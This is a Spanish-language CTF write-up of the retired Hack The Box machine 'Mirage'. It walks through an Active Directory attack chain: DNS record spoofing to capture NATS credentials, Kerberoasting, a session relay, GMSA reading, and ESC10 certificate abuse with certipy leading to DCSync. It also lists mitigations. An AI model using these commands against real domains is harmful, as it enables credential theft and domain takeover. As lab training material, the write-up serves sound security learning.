---
machine: Mirage
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, nfs, nats, kerberoast, relay, gmsa, esc10, dcsync]
---

# Mirage — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un NFS abierto contiene informes que revelan el dominio y un nombre `nats-svc` sin registro DNS. Se registra ese nombre apuntando al atacante y se capturan credenciales NATS; el JetStream filtra otra contraseña, con la que se Kerberoastea a `nathan.aadam`. Un relay de sesión cruzada captura el hash de `mark.bbond`, que fuerza el cambio de contraseña de un contratista; tras habilitarlo y ajustar su horario se lee la GMSA y se explota ESC10 para autenticarse como la cuenta de máquina del DC y hacer DCSync.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,2049,3268,4222,5985 <IP>
```

- Controlador de dominio `MIRAGE.HTB` con DNS, Kerberos, LDAP, SMB, NFS y WinRM.
- NATS en `4222` y NFS en `2049`.
- NTLM deshabilitado; Kerberos es obligatorio y el reloj debe estar sincronizado.

## Enumeración

Se listan los shares NFS y se descargan dos PDF: uno de endurecimiento de autenticación y otro sobre un registro DNS ausente para `nats-svc.mirage.htb`. El nombre no resuelve; se añade un registro A hacia el atacante con `nsupdate` y se ejecuta un servidor NATS falso o un listener para capturar el `CONNECT` con usuario y contraseña.

## Foothold

Con las credenciales NATS se enumeran streams y mensajes; uno contiene la contraseña de `david.jjackson`. Ese usuario Kerberoastea a `nathan.aadam`; el TGS se crackea y sus credenciales permiten WinRM. Desde ahí se observa una sesión de otro usuario y se hace un relay RPC de sesión cruzada.

```bash
# DNS y captura NATS
nsupdate
> update add nats-svc.mirage.htb 86400 A <ATTACKER>
> send
# Kerberoast y relay
netexec ldap DC01.mirage.htb -u david.jjackson -p '<PASS>' -k --kerberoasting tgs.txt
# ESC10
certipy account -user mark.bbond update -upn 'DC01$@mirage.htb' -target DC01.mirage.htb -k
certipy req -target DC01.mirage.htb -ca mirage-DC01-CA -template User -u mark.bbond@mirage.htb -p '<PASS>'
certipy auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell```

## Movimiento lateral

El relay captura el hash de `mark.bbond`, que se crackea. `mark.bbond` tiene `ForceChangePassword` sobre `javier.mmarshall`; la cuenta está deshabilitada y sin horario, así que se habilita y se configura `logonHours` con `bloodyAD`. `javier.mmarshall` puede leer la contraseña de la GMSA `Mirage-Service$`.

## Escalada de privilegios

`Mirage-Service$` puede escribir el UPN de `mark.bbond`. El DC tiene `CertificateMappingMethods=0x4`, por lo que ESC10 permite cambiar el UPN de `mark.bbond` al de `DC01$`, pedir un certificado con la plantilla `User`, restaurar el UPN y autenticarse como la cuenta de máquina. Con ese contexto se hace DCSync y se obtiene el hash de Administrator.

## Evidencia

- Informes en NFS y registro DNS ausente.
- Credenciales NATS capturadas y mensaje con otra contraseña.
- Kerberoast, relay de sesión y cambio de contraseña.
- GMSA y ESC10 hasta DCSync.

## Lecciones aprendidas

- Un registro DNS ausente se puede suplantar para capturar credenciales.
- Los mensajes de un bus NATS pueden contener secretos.
- Un relay de sesión cruzada salta las restricciones de NTLM.
- ESC10 depende del mapeo UPN de Schannel, no solo de las plantillas.

## Mitigación y detección

- Registrar todos los nombres internos y usar DNSSEC.
- Restringir NATS y no enviar credenciales por el bus.
- Auditar ACLs AD, cuentas deshabilitadas y horarios.
- Revisar `CertificateMappingMethods` y aplicar el mínimo privilegio.

## Referencias

- [0xdf — Mirage](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [IppSec — Mirage](https://www.youtube.com/watch?v=0oSGKL9jbAQ)
- [Hack The Box — Mirage](https://app.hackthebox.com/machines/mirage)
